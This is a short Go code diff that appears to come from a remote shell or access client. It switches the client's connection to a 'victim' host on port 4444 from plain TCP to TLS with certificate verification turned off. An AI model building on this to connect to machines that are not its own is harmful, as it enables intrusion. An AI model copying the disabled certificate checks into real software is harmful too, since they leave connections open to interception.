@@ -1,8 +1,8 @@
 package main
 
 import (
+	"crypto/tls"
 	"fmt"
-	"net"
 	"os"
 	"os/signal"
 	"syscall"
@@ -10,13 +10,15 @@ import (
 	"golang.org/x/term"
 )
 
-	const (
-        victimIP = "localhost"
-        victimPort = "4444"
-    )
+const (
+	victimIP   = "localhost"
+	victimPort = "4444"
+)
 
 func main() {
-	conn, err := net.Dial("tcp", victimIP+":"+victimPort)
+	config := &tls.Config{InsecureSkipVerify: true}
+
+	conn, err := tls.Dial("tcp", victimIP+":"+victimPort, config)
 	if err != nil {
 		fmt.Println("Failed to connect to victim:", err)
 		return
